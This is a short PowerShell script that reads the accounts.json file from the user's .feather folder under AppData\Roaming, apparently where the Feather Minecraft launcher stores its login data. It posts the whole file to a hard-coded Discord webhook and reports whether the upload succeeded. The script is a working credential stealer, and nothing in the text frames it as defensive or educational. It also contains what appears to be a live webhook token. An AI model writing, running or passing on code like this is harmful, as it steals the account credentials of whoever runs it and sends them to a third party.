# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1357740527637758222/vEIwp5BR2jFWTvegjKyEBAo5x-9hP6DvIxurkGDbFRijQ_-ZYvTiphi_nNz1iW-c_bch"

# Path to the accounts.json file
$filePath = "$env:USERPROFILE\AppData\Roaming\.feather\accounts.json"

# Check if the file exists
if (-not (Test-Path $filePath)) {
    Write-Host "File accounts.json does not exist at the specified path."
    exit
}

# Read the contents of the accounts.json file
$fileContents = Get-Content -Path $filePath -Raw

# Prepare payload JSON
$payload = @{
    content = $fileContents
} | ConvertTo-Json -Depth 3

# Send the request
try {
    $response = Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"

    # Check if the request succeeded
    if ($response.StatusCode -eq 200) {
        Write-Host "Contents sent successfully!"
    } else {
        Write-Host "Failed to send the webhook request. Status Code: $($response.StatusCode)"
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)"
}
